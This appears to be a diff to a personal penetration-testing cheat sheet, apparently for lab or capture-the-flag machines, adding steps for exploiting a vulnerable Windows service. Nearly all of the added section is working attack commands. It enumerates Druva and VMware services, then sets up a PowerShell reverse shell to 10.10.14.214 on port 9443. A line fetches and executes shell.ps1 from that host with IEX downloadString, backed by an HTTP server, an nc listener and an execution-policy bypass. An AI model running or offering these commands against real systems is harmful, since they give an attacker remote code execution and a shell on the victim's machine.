@@ -593,8 +593,50 @@ exploit
 ```
 net start MozillaMaintenance 
 ```
- 
- 
+ # Vulnerable Services
+### Enumerating Installed Programs
+```
+wmic product get name
+```
+### Enumerating local ports
+```
+netstat -ano | findstr 6064
+```
+### Enumerating Process ID
+```
+get-process -Id 3324
+```
+### Enumerating running service
+```
+get-service | ? {$_.DisplayName -like 'Druva*'}
+```
+```
+get-service | ? {$_.DisplayName -like 'VMware*'}
+```
+### Invoke-PowerShellTcp.ps1
+Add in the information listed to the bootome of the script and rename it shell.ps1
+```
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.214 -Port 9443
+```
+### druval.ps1
+Modify the powershell script for Reverse Shell
+```
+$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.214:8080/shell.ps1')"
+```
+### start HTTP Server
+```
+python3 -m http.server 8080
+```
+### Start listener
+```
+nc -lvnp 9443
+```
+### Modify the Powershell Execution Polciy
+```
+set-ExecutionPolicy Bypass -Scope Process
+```
+Execute the duval.ps1, I had to use Powershell ISE to get it to work properly. 
+
 
 
 
